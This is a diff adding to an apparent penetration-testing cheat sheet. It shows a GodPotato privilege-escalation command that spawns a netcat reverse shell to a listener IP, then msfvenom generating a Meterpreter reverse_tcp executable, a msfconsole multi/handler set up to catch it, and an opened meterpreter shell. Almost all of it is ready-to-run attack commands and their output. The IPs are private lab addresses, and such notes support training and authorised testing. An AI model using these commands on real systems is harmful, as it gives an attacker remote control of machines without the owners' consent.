@@ -676,3 +676,28 @@ https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalatio
 ```
 GodPotato-NET2.exe -cmd "nc_win.exe 192.168.45.190 4444 -e cmd"
 ```
+### msfconsole
+```
+kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
+```
+
+```
+kali@kali:~/beyond$ sudo msfconsole -q msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.119.5 LHOST => 192.168.119.5
+msf6 exploit(multi/handler) > set LPORT 443 LPORT => 443
+msf6 exploit(multi/handler) > set ExitOnSession false ExitOnSession => false
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started HTTPS reverse handler on https://192.168.119.5:443
+```
+
+```
+msf6 post(multi/manage/autoroute) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > shell
+Process 7532 created.
+```
